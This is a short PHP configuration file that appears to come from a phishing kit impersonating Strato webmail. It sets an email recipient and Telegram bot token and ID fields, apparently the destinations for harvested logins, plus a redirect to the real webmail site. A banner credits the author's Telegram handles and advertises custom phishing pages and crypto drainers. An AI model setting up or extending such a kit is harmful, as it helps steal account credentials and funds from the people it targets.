<?php
$recipient = "test@outlook.com"; //Add Your Email Here


//Redirect Link
$Redirect = "https://href.li/https://webmail.strato.de/appsuite";


//Add Telegram
$TeleToken=""; //Add Your BOT API Token
$TeleID=""; //Add Your ID



/*
<!--


		██████████          ███████       █████████    █████       █████ ████████         
		░░███░░░░░█         ░░░░░███      ███░░░░░███ ███░░░███    ░░███ ███░░░░███        
		░███  █ ░█████ ████████░███     ███     ░░░ ███   ░░███ ███████░░░    ░██████████ 
		░██████ ░░███ ░░██░░███░███    ░███        ░███    ░██████░░███   ██████░░███░░███
		░███░░█  ░███  ░███░███░███    ░███        ░███    ░██░███ ░███  ░░░░░░██░███ ░░░ 
		░███ ░   ░░███ ███ ░███░███    ░░███     ██░░███   ███░███ ░███ ███   ░██░███     
		██████████░░█████  █████████    ░░█████████ ░░░█████░ ░░███████░░█████████████    
		░░░░░░░░░░  ░░░░░  ░░░░░░░░░      ░░░░░░░░░    ░░░░░░   ░░░░░░░░ ░░░░░░░░░░░░░    
		
		                                                       

# ✔   𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: @evilcoder_1337
# ✔   𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: @alsakib944
         -𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐌𝐞 𝐇𝐞𝐫𝐞-
|#|================================|#|
Want To Build New Page / Fix Bugs or Build Crypto Drainer? Contact ME!
-->*/
?>